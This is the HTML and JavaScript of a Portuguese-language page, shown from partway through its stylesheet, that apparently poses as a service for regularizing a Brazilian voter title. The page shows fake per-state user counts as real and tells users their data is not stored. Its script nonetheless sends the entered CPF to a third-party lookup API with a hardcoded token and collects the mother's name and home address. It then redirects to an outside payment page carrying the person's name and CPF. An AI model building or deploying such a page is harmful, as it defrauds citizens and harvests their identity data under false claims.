            .btn-group .btn-primary, .btn-group .btn-secondary {
                width: auto;
                flex: 1;
                max-width: 180px;
            }
            .address-grid {
                grid-template-columns: 1fr 2fr;
            }
            .input-field, .select-field {
                padding: 0.75rem;
                font-size: 16px;
            }
            .preview-box {
                padding: 1.25rem;
                font-size: 0.95rem;
            }
            .preview-box div {
                font-size: 0.95rem;
            }
        }
    </style>
</head>
<body>
    <div class="main-wrapper">
        <header class="header">
            <div class="logo-container">
                <img src="https://cdn-icons-png.flaticon.com/512/197/197386.png" alt="EdocBr Logo" class="logo">
                <span class="brand-name">Título EdocBr</span>
            </div>
            <button class="mobile-menu-btn" id="mobileMenuBtn">
                <i class="fas fa-bars"></i>
            </button>
            <nav class="nav-menu" id="navMenu">
                <ul>
                    <li><a href="/">Voltar ao Início</a></li>
                </ul>
            </nav>
        </header>

        <main class="main-content">
            <div class="container">
                <h1 class="section-title">Solicitação de e-Doc Tipo: Regularizar Título</h1>

                <!-- Step 1: Cidade Natal e Estado -->
                <div class="step active" id="step1">
                    <h2 class="text-lg font-semibold mb-3 text-center text-gray-800">Informações Iniciais</h2>
                    <div class="address-field">
                        <label for="cidadeNatalInput" class="block text-xs font-medium text-gray-700 mb-1">Cidade Natal *</label>
                        <input type="text" id="cidadeNatalInput" placeholder="Digite sua cidade natal" class="input-field" required>
                    </div>
                    <div class="address-field">
                        <label for="estadoVotoInput" class="block text-xs font-medium text-gray-700 mb-1">Estado onde exerce voto *</label>
                        <select id="estadoVotoInput" class="select-field" required>
                            <option value="">Selecione o estado</option>
                            <option value="AC">Acre (AC)</option>
                            <option value="AL">Alagoas (AL)</option>
                            <option value="AP">Amapá (AP)</option>
                            <option value="AM">Amazonas (AM)</option>
                            <option value="BA">Bahia (BA)</option>
                            <option value="CE">Ceará (CE)</option>
                            <option value="DF">Distrito Federal (DF)</option>
                            <option value="ES">Espírito Santo (ES)</option>
                            <option value="GO">Goiás (GO)</option>
                            <option value="MA">Maranhão (MA)</option>
                            <option value="MT">Mato Grosso (MT)</option>
                            <option value="MS">Mato Grosso do Sul (MS)</option>
                            <option value="MG">Minas Gerais (MG)</option>
                            <option value="PA">Pará (PA)</option>
                            <option value="PB">Paraíba (PB)</option>
                            <option value="PR">Paraná (PR)</option>
                            <option value="PE">Pernambuco (PE)</option>
                            <option value="PI">Piauí (PI)</option>
                            <option value="RJ">Rio de Janeiro (RJ)</option>
                            <option value="RN">Rio Grande do Norte (RN)</option>
                            <option value="RS">Rio Grande do Sul (RS)</option>
                            <option value="RO">Rondônia (RO)</option>
                            <option value="RR">Roraima (RR)</option>
                            <option value="SC">Santa Catarina (SC)</option>
                            <option value="SP">São Paulo (SP)</option>
                            <option value="SE">Sergipe (SE)</option>
                            <option value="TO">Tocantins (TO)</option>
                        </select>
                        <p class="text-xs text-gray-500 mt-1">Selecione o estado onde deseja exercer seu direito ao voto.</p>
                    </div>
                    <button onclick="validarInformacoesIniciais()" class="btn-primary">
                        <i class="fas fa-arrow-right mr-2"></i> Próximo
                    </button>
                    <div id="resultadoInicial" class="mt-2 text-center"></div>
                </div>

                <!-- Step 2: Análise do Estado -->
                <div class="step" id="step2">
                    <h2 class="text-lg font-semibold mb-3 text-center text-gray-800">Analisando Informações</h2>
                    <div class="loading-container">
                        <div class="spinner"></div>
                        <p class="loading-text">Verificando disponibilidade...</p>
                    </div>
                </div>

                <!-- Step 3: CPF and Via Selection -->
                <div class="step" id="step3">
                    <h2 class="text-lg font-semibold mb-3 text-center text-gray-800">Verificação de Dados</h2>
                    <div class="info-message">
                        <p>Facilitamos o processo digital para</p>
                        <p class="big-number" id="usuariosEstado">+3.568</p>
                        <p>usuários desse estado</p>
                    </div>
                    <div class="address-field">
                        <label for="cpfInput" class="block text-xs font-medium text-gray-700 mb-1">Digite o seu CPF *</label>
                        <input type="text" id="cpfInput" placeholder="000.000.000-00" class="input-field" maxlength="14" required>
                        <label for="nomeMaeInput" class="block text-xs font-medium text-gray-700 mb-1">Nome Completo da Mãe *</label>
                        <input type="text" id="nomeMaeInput" placeholder="Nome completo da mãe" class="input-field">
                        <p class="text-xs text-gray-500 mt-1">Não armazenamos seus dados. Consulta 100% segura.</p>
                    </div>
                    <div class="address-field">
                        <label class="block text-xs font-medium text-gray-700 mb-1">Selecione o tipo de via *</label>
                        <div class="radio-field">
                            <input type="radio" name="via" value="Primeira Via" id="via1" required>
                            <label for="via1">Primeira Via</label>
                        </div>
                        <div class="radio-field">
                            <input type="radio" name="via" value="Segunda Via" id="via2">
                            <label for="via2">Segunda Via</label>
                        </div>
                    </div>
                    <button onclick="consultarCPF()" class="btn-primary">
                        <i class="fas fa-search mr-2"></i> Verificar Dados
                    </button>
                    <button onclick="voltarStep(1)" class="btn-secondary">
                        <i class="fas fa-arrow-left mr-2"></i> Voltar
                    </button>
                    <div id="resultadoCPF" class="mt-2 text-center"></div>
                </div>

                <!-- Step 4: Display Results -->
                <div class="step" id="step4">
                    <h2 class="text-lg font-semibold mb-3 text-center text-gray-800">Confirme seus Dados</h2>
                    <div class="preview-box">
                        <h3 class="text-sm font-semibold mb-2 text-gray-800">Dados Pessoais</h3>
                        <div><strong>Nome Completo:</strong> <span id="nomeCompleto" class="font-medium"></span></div>
                        <div><strong>Data de Nascimento:</strong> <span id="dataNascimento" class="font-medium"></span></div>
                        <div><strong>Nome da Mãe:</strong> <span id="nomeMaeCompleto" class="font-medium"></span></div>
                        <div><strong>Tipo de eDoc:</strong> <span id="viaSelecionada" class="font-medium"></span></div>
                    </div>
                    <div class="preview-box">
                        <h3 class="text-sm font-semibold mb-2 text-gray-800">Informações Eleitorais</h3>
                        <div><strong>Cidade Natal:</strong> <span id="cidadeNatalExibir" class="font-medium"></span></div>
                        <div><strong>Estado onde votará:</strong> <span id="estadoVotoExibir" class="font-medium"></span></div>
                    </div>
                    <div class="btn-group">
                        <button onclick="proximoStep(5)" class="btn-primary">
                            <i class="fas fa-arrow-right mr-2"></i> Prosseguir
                        </button>
                        <button onclick="finalizar()" class="btn-primary">
                            <i class="fas fa-redo mr-2"></i> Nova Consulta
                        </button>
                        <button onclick="voltarStep(3)" class="btn-secondary">
                            <i class="fas fa-arrow-left mr-2"></i> Voltar
                        </button>
                    </div>
                </div>

                <!-- Step 5: Address Details -->
                <div class="step" id="step5">
                    <h2 class="text-lg font-semibold mb-3 text-center text-gray-800">Informações de Endereço</h2>
                    <div class="address-field">
                        <label for="cepInput" class="block text-xs font-medium text-gray-700 mb-1">CEP *</label>
                        <input type="text" id="cepInput" placeholder="00000-000" class="input-field" maxlength="9">
                    </div>
                    <div class="address-field">
                        <label for="logradouro" class="block text-xs font-medium text-gray-700 mb-1">Logradouro *</label>
                        <input type="text" id="logradouro" class="input-field" disabled>
                    </div>
                    <div class="address-grid">
                        <div class="address-field">
                            <label for="numero" class="block text-xs font-medium text-gray-700 mb-1">Número *</label>
                            <input type="text" id="numero" class="input-field">
                        </div>
                        <div class="address-field">
                            <label for="complemento" class="block text-xs font-medium text-gray-700 mb-1">Complemento</label>
                            <input type="text" id="complemento" class="input-field" placeholder="Apto, Casa, etc.">
                        </div>
                    </div>
                    <div class="address-field">
                        <label for="bairro" class="block text-xs font-medium text-gray-900 mb-1">Bairro *</label>
                        <input type="text" id="bairro" class="input-field" disabled>
                    </div>
                    <div class="address-grid">
                        <div class="address-field">
                            <label for="cidade" class="block text-xs font-medium text-gray-700 mb-1">Cidade *</label>
                            <input type="text" id="cidade" class="input-field" disabled>
                        </div>
                        <div class="address-field">
                            <label for="uf" class="block text-xs font-medium text-gray-700 mb-1">Estado *</label>
                            <input type="text" id="uf" class="input-field" style="text-transform: uppercase;" disabled>
                        </div>
                    </div>
                    <div class="btn-group">
                        <button onclick="proximoStep(6)" class="btn-primary">
                            <i class="fas fa-arrow-right mr-2"></i> Prosseguir
                        </button>
                        <button onclick="voltarStep(4)" class="btn-secondary">
                            <i class="fas fa-arrow-left mr-2"></i> Voltar
                        </button>
                    </div>
                    <div id="resultadoEndereco" class="mt-2 text-center"></div>
                </div>

                <!-- Step 6: Confirmation -->
                <div class="step" id="step6">
                    <h2 class="text-lg font-semibold mb-3 text-center text-gray-800">Confirmação Final</h2>
                    <div class="preview-box">
                        <h3 class="text-sm font-semibold mb-2 text-gray-800">Dados Pessoais</h3>
                        <div><strong>Nome Completo:</strong> <span id="nomeCompletoFinal" class="font-medium"></span></div>
                        <div><strong>Data de Nascimento:</strong> <span id="dataNascimentoFinal" class="font-medium"></span></div>
                        <div><strong>Nome da Mãe:</strong> <span id="nomeMaeFinal" class="font-medium"></span></div>
                        <div><strong>Tipo de eDoc:</strong> <span id="viaSelecionadaFinal" class="font-medium"></span></div>
                    </div>
                    <div class="preview-box">
                        <h3 class="text-sm font-semibold mb-2 text-gray-800">Informações Eleitorais</h3>
                        <div><strong>Cidade Natal:</strong> <span id="cidadeNatalFinal" class="font-medium"></span></div>
                        <div><strong>Estado onde votará:</strong> <span id="estadoVotoFinal" class="font-medium"></span></div>
                    </div>
                    <div class="preview-box">
                        <h3 class="text-sm font-semibold mb-2 text-gray-800">Endereço</h3>
                        <div><strong>CEP:</strong> <span id="cepFinal" class="font-medium"></span></div>
                        <div><strong>Logradouro:</strong> <span id="logradouroFinal" class="font-medium"></span></div>
                        <div><strong>Número:</strong> <span id="numeroFinal" class="font-medium"></span></div>
                        <div><strong>Complemento:</strong> <span id="complementoFinal" class="font-medium"></span></div>
                        <div><strong>Bairro:</strong> <span id="bairroFinal" class="font-medium"></span></div>
                        <div><strong>Cidade:</strong> <span id="cidadeFinal" class="font-medium"></span></div>
                        <div><strong>Estado:</strong> <span id="ufFinal" class="font-medium"></span></div>
                    </div>
                    <div class="btn-group">
                        <button onclick="enviarSolicitacao()" class="btn-primary">
                            <i class="fas fa-check-circle mr-2"></i> Solicitar e-Doc
                        </button>
                        <button onclick="voltarStep(5)" class="btn-secondary">
                            <i class="fas fa-arrow-left mr-2"></i> Voltar
                        </button>
                    </div>
                    <div id="resultadoConfirmacao" class="mt-2 text-center"></div>
                </div>
            </div>
        </main>
    </div>

    <footer class="footer">
        <div class="copyright">
            <p>EdocBr © 2025 - Todos os direitos reservados</p>
            <p class="mt-1">
                <a href="/termos">Termos de Uso</a> | 
                <a href="/privacidade">Política de Privacidade</a>
            </p>
        </div>
    </footer>

    <script>
        let consultaData = null;
        let enderecoData = null;
        let informacoesIniciais = null;

        // Números de usuários por estado (simulado)
        const usuariosPorEstado = {
            'AC': 1245, 'AL': 2156, 'AP': 987, 'AM': 3421, 'BA': 8765,
            'CE': 6543, 'DF': 4321, 'ES': 3890, 'GO': 5234, 'MA': 4567,
            'MT': 3456, 'MS': 2890, 'MG': 9876, 'PA': 5678, 'PB': 3234,
            'PR': 7654, 'PE': 6789, 'PI': 2345, 'RJ': 8901, 'RN': 3456,
            'RS': 7890, 'RO': 2123, 'RR': 876, 'SC': 5678, 'SP': 12456,
            'SE': 2234, 'TO': 1876
        };

        // Mobile Menu Toggle
        const mobileMenuBtn = document.getElementById('mobileMenuBtn');
        const navMenu = document.getElementById('navMenu');

        mobileMenuBtn.addEventListener('click', () => {
            navMenu.classList.toggle('active');
            mobileMenuBtn.innerHTML = navMenu.classList.contains('active') 
                ? '<i class="fas fa-times"></i>' 
                : '<i class="fas fa-bars"></i>';
        });

        // Máscara de CPF
        document.getElementById('cpfInput').addEventListener('input', function (e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 11) value = value.slice(0, 11);
            value = value.replace(/^(\d{3})(\d)/, '$1.$2')
                        .replace(/^(\d{3})\.(\d{3})(\d)/, '$1.$2.$3')
                        .replace(/\.(\d{3})(\d)/, '.$1-$2');
            e.target.value = value;
        });

        // Máscara de CEP e busca automática
        document.getElementById('cepInput').addEventListener('input', function (e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 8) value = value.slice(0, 8);
            value = value.replace(/^(\d{5})(\d)/, '$1-$2');
            e.target.value = value;

            if (value.replace(/\D/g, '').length === 8) {
                buscarCEP();
            } else {
                document.getElementById('logradouro').value = '';
                document.getElementById('bairro').value = '';
                document.getElementById('cidade').value = '';
                document.getElementById('uf').value = '';
                document.getElementById('complemento').value = '';
            }
        });

        // Validação de CPF
        function validarCPF(cpf) {
            cpf = cpf.replace(/[^\d]/g, '');
            if (cpf.length !== 11) return false;
            if (/^(\d)\1{10}$/.test(cpf)) return false;
            let soma = 0;
            for (let i = 0; i < 9; i++) soma += parseInt(cpf.charAt(i)) * (10 - i);
            let resto = (soma * 10) % 11;
            if (resto === 10 || resto === 11) resto = 0;
            if (resto !== parseInt(cpf.charAt(9))) return false;
            soma = 0;
            for (let i = 0; i < 10; i++) soma += parseInt(cpf.charAt(i)) * (11 - i);
            resto = (soma * 10) % 11;
            if (resto === 10 || resto === 11) resto = 0;
            return resto === parseInt(cpf.charAt(10));
        }

        // Exibir mensagens de feedback
        function showMessage(elementId, type, message) {
            const resultadoDiv = document.getElementById(elementId);
            resultadoDiv.innerHTML = `<p class="${type}">${message}</p>`;
            setTimeout(() => resultadoDiv.innerHTML = '', 3000);
        }

        // Validar informações iniciais (Step 1)
        function validarInformacoesIniciais() {
            const cidadeNatal = document.getElementById('cidadeNatalInput').value.trim();
            const estadoVoto = document.getElementById('estadoVotoInput').value;
            const resultadoDiv = document.getElementById('resultadoInicial');

            if (!cidadeNatal || cidadeNatal.length < 3) {
                showMessage('resultadoInicial', 'error', 'Por favor, informe sua cidade natal');
                return;
            }

            if (!estadoVoto) {
                showMessage('resultadoInicial', 'error', 'Por favor, selecione o estado onde quer votar');
                return;
            }

            informacoesIniciais = {
                cidadeNatal: cidadeNatal,
                estadoVoto: estadoVoto
            };

            // Ir para step 2 (análise)
            proximoStep(2);

            // Simular análise de 2-3 segundos
            setTimeout(() => {
                // Atualizar número de usuários
                const numUsuarios = usuariosPorEstado[estadoVoto] || 3568;
                document.getElementById('usuariosEstado').textContent = `+${numUsuarios.toLocaleString('pt-BR')}`;

                // Ir para step 3
                proximoStep(3);
            }, 2500);
        }

        async function consultarCPF() {
            const cpfInput = document.getElementById('cpfInput').value;
            const nomeMaeInput = document.getElementById('nomeMaeInput').value;
            const viaSelecionada = document.querySelector('input[name="via"]:checked');
            const resultadoDiv = document.getElementById('resultadoCPF');
            const consultButton = document.querySelector('#step3 .btn-primary');
            consultButton.disabled = true;

            resultadoDiv.innerHTML = `
                <div class="loading-container">
                    <div class="spinner"></div>
                    <p class="loading-text">Verificando Dados...</p>
                </div>
            `;

            const cpf = cpfInput.replace(/\D/g, '');
            const cpfPattern = /^\d{3}\.\d{3}\.\d{3}-\d{2}$/;

            if (!cpfInput) {
                consultButton.disabled = false;
                showMessage('resultadoCPF', 'error', 'Por favor, informe seu CPF');
                return;
            } else if (!cpfPattern.test(cpfInput)) {
                consultButton.disabled = false;
                showMessage('resultadoCPF', 'error', 'Formato de CPF inválido. Use: 000.000.000-00');
                return;
            } else if (!validarCPF(cpfInput)) {
                consultButton.disabled = false;
                showMessage('resultadoCPF', 'error', 'CPF inválido. Verifique os dígitos.');
                return;
            } else if (!nomeMaeInput || nomeMaeInput.trim().length < 3) {
                consultButton.disabled = false;
                showMessage('resultadoCPF', 'error', 'Por favor, informe o nome completo da mãe');
                return;
            } else if (!viaSelecionada) {
                consultButton.disabled = false;
                showMessage('resultadoCPF', 'error', 'Por favor, selecione o tipo de via (Primeira ou Segunda Via)');
                return;
            }

            try {
                const response = await fetch(`https://searchapi.dnnl.live/consulta?cpf=${cpf}&token_api=5621`, {
                    headers: {
                        'Content-Type': 'application/json'
                    }
                });

                if (!response.ok) {
                    throw new Error('Erro ao consultar CPF');
                }

                const apiData = await response.json();
                console.log('Resposta da API:', apiData);

                const dadosApi = apiData.dados && apiData.dados[0];

                if (!dadosApi || !dadosApi.NOME || !dadosApi.NASC) {
                    consultButton.disabled = false;
                    showMessage('resultadoCPF', 'error', 'Dados não encontrados para este CPF');
                    return;
                }

                consultaData = {
                    cpf: dadosApi.CPF || cpf,
                    nome_completo: dadosApi.NOME,
                    data_nascimento: dadosApi.NASC,
                    nome_mae: nomeMaeInput.trim(),
                    via: viaSelecionada.value + " Título Eleitor"
                };

                document.getElementById('nomeCompleto').textContent = consultaData.nome_completo.toUpperCase();
                document.getElementById('dataNascimento').textContent = consultaData.data_nascimento;
                document.getElementById('nomeMaeCompleto').textContent = consultaData.nome_mae.toUpperCase();
                document.getElementById('viaSelecionada').textContent = consultaData.via;

                // Exibir informações eleitorais
                document.getElementById('cidadeNatalExibir').textContent = informacoesIniciais.cidadeNatal.toUpperCase();
                const estadoNome = document.getElementById('estadoVotoInput').selectedOptions[0].text;
                document.getElementById('estadoVotoExibir').textContent = estadoNome;

                consultButton.disabled = false;
                resultadoDiv.innerHTML = '';
                proximoStep(4);

            } catch (error) {
                consultButton.disabled = false;
                showMessage('resultadoCPF', 'error', `Erro na consulta: ${error.message}`);
            }
        }

        async function buscarCEP() {
            const cepInput = document.getElementById('cepInput').value;
            const resultadoDiv = document.getElementById('resultadoEndereco');
            const cep = cepInput.replace(/\D/g, '');

            if (cep.length !== 8) {
                return;
            }

            resultadoDiv.innerHTML = `
                <div class="loading-container">
                    <div class="spinner"></div>
                    <p class="loading-text">Buscando CEP...</p>
                </div>
            `;

            try {
                const response = await fetch(`https://brasilapi.com.br/api/cep/v1/${cep}`);

                if (!response.ok) {
                    throw new Error('CEP não encontrado');
                }

                const data = await response.json();

                enderecoData = {
                    cep: cep,
                    logradouro: data.street || '',
                    complemento: '',
                    bairro: data.neighborhood || '',
                    cidade: data.city || '',
                    uf: data.state || ''
                };

                document.getElementById('logradouro').value = enderecoData.logradouro;
                document.getElementById('bairro').value = enderecoData.bairro;
                document.getElementById('cidade').value = enderecoData.cidade;
                document.getElementById('uf').value = enderecoData.uf;

                resultadoDiv.innerHTML = '';
                showMessage('resultadoEndereco', 'success', '✓ CEP encontrado!');

            } catch (error) {
                try {
                    const response2 = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
                    const data2 = await response2.json();

                    if (data2.erro === true) {
                        throw new Error('CEP não encontrado');
                    }

                    enderecoData = {
                        cep: data2.cep,
                        logradouro: data2.logradouro || '',
                        complemento: data2.complemento || '',
                        bairro: data2.bairro || '',
                        cidade: data2.localidade || '',
                        uf: data2.uf || ''
                    };

                    document.getElementById('logradouro').value = enderecoData.logradouro;
                    document.getElementById('bairro').value = enderecoData.bairro;
                    document.getElementById('cidade').value = enderecoData.cidade;
                    document.getElementById('uf').value = enderecoData.uf;
                    if (enderecoData.complemento) {
                        document.getElementById('complemento').value = enderecoData.complemento;
                    }

                    resultadoDiv.innerHTML = '';
                    showMessage('resultadoEndereco', 'success', '✓ CEP encontrado!');

                } catch (error2) {
                    console.error('Erro ao buscar CEP:', error2);
                    showMessage('resultadoEndereco', 'error', 'CEP não encontrado. Verifique e tente novamente.');
                    limparCamposEndereco();
                }
            }
        }

        function limparCamposEndereco() {
            document.getElementById('logradouro').value = '';
            document.getElementById('bairro').value = '';
            document.getElementById('cidade').value = '';
            document.getElementById('uf').value = '';
            enderecoData = null;
        }

        function enviarSolicitacao() {
            const numero = document.getElementById('numero').value;
            const resultadoDiv = document.getElementById('resultadoConfirmacao');

            if (!numero) {
                showMessage('resultadoConfirmacao', 'error', 'Por favor, informe o número');
                return;
            }

            if (!enderecoData || !enderecoData.cep) {
                showMessage('resultadoConfirmacao', 'error', 'Por favor, informe um CEP válido');
                return;
            }

            if (!consultaData || !consultaData.nome_completo || !consultaData.cpf) {
                showMessage('resultadoConfirmacao', 'error', 'Dados pessoais não encontrados. Por favor, refaça a consulta.');
                return;
            }

            resultadoDiv.innerHTML = `
                <div class="loading-container">
                    <div class="spinner"></div>
                    <p class="loading-text">Carregando informações...</p>
                </div>
            `;

            const checkoutUrl = `https://pay.docfacil.digital/v7R0glkabeVGVr9?nome=${encodeURIComponent(consultaData.nome_completo)}&cpf=${consultaData.cpf}`;
            console.log('URL de checkout gerado:', checkoutUrl);

            setTimeout(() => {
                resultadoDiv.innerHTML = '<p class="success">Solicitação enviada com sucesso! Redirecionando para o pagamento...</p>';

                document.getElementById('cepInput').value = '';
                document.getElementById('logradouro').value = '';
                document.getElementById('numero').value = '';
                document.getElementById('complemento').value = '';
                document.getElementById('bairro').value = '';
                document.getElementById('cidade').value = '';
                document.getElementById('uf').value = '';

                setTimeout(() => {
                    window.location.href = checkoutUrl;
                }, 500);
            }, 500);
        }

        function proximoStep(step) {
            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
            document.getElementById(`step${step}`).classList.add('active');

            if (step === 6) {
                document.getElementById('nomeCompletoFinal').textContent = consultaData.nome_completo.toUpperCase();
                document.getElementById('dataNascimentoFinal').textContent = consultaData.data_nascimento;
                document.getElementById('nomeMaeFinal').textContent = consultaData.nome_mae.toUpperCase();
                document.getElementById('viaSelecionadaFinal').textContent = consultaData.via;

                document.getElementById('cidadeNatalFinal').textContent = informacoesIniciais.cidadeNatal.toUpperCase();
                const estadoNome = document.getElementById('estadoVotoInput').selectedOptions[0].text;
                document.getElementById('estadoVotoFinal').textContent = estadoNome;

                document.getElementById('cepFinal').textContent = enderecoData.cep;
                document.getElementById('logradouroFinal').textContent = enderecoData.logradouro;
                document.getElementById('numeroFinal').textContent = document.getElementById('numero').value;
                document.getElementById('complementoFinal').textContent = document.getElementById('complemento').value || 'Não informado';
                document.getElementById('bairroFinal').textContent = enderecoData.bairro;
                document.getElementById('cidadeFinal').textContent = enderecoData.cidade;
                document.getElementById('ufFinal').textContent = enderecoData.uf;
            }

            window.scrollTo({ top: document.getElementById('step1').offsetTop - 80, behavior: 'smooth' });
        }

        function voltarStep(step) {
            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
            document.getElementById(`step${step}`).classList.add('active');

            window.scrollTo({ top: document.getElementById('step1').offsetTop - 80, behavior: 'smooth' });
        }

        function finalizar() {
            document.getElementById('cidadeNatalInput').value = '';
            document.getElementById('estadoVotoInput').value = '';

            document.getElementById('cpfInput').value = '';
            document.getElementById('nomeMaeInput').value = '';
            document.querySelectorAll('input[name="via"]').forEach(radio => {
                radio.checked = false;
            });
            document.getElementById('nomeCompleto').textContent = '';
            document.getElementById('dataNascimento').textContent = '';
            document.getElementById('nomeMaeCompleto').textContent = '';
            document.getElementById('viaSelecionada').textContent = '';

            document.getElementById('cepInput').value = '';
            document.getElementById('logradouro').value = '';
            document.getElementById('numero').value = '';
            document.getElementById('complemento').value = '';
            document.getElementById('bairro').value = '';
            document.getElementById('cidade').value = '';
            document.getElementById('uf').value = '';

            consultaData = null;
            enderecoData = null;
            informacoesIniciais = null;
            proximoStep(1);
        }
    </script>
</body>
